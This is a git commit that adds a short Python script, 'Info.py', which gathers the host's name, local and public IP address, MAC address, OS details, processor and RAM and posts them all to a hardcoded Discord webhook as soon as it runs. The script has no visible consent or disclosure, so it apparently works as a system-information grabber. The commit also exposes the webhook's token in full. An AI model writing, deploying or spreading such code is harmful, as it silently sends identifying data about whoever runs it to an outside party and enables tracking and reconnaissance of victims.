511a58967a331ab099c211f6a6f034ab50d42045
ZIE <53877538+zi1e@users.noreply.github.com>
2021-04-28 11:56:50 -1000

    Add files via upload

---
+++ Python-Info/Info.py
@@ -0,0 +1,30 @@
+import socket
+import platform,socket,re,uuid,json,psutil,logging
+from discord_webhook import DiscordWebhook
+from requests import get
+
+def getSystemInfo():
+    try:
+        info={}
+        info['Platform']=platform.system()
+        info['Platform-Release']=platform.release()
+        info['Platform-Version']=platform.version()
+        info['Architecture']=platform.machine()
+        info['Hostname']=socket.gethostname()
+        info['Mac-Address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        info['Processor']=platform.processor()
+        info['Ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
+        return json.dumps(info)
+    except Exception as e:
+        logging.exception(e)
+
+hostname = socket.gethostname()
+ip_address = socket.gethostbyname(hostname)
+ip = get('https://api.ipify.org').text
+
+webhook = DiscordWebhook(
+      url='https://discord.com/api/webhooks/836317068559122492/3sRD9NgyAogmCJWmbaJpu-mjYzZK0H4MuAH8JNQGb8V4mye6X4UoyKmC_HCsn3bymAAO',
+      content=f"```Hostname: {hostname}```\n```IP Address: {ip_address}```\n```Public IP Address: {ip}```\n```\n{getSystemInfo()}```\n",
+)
+
+response = webhook.execute()
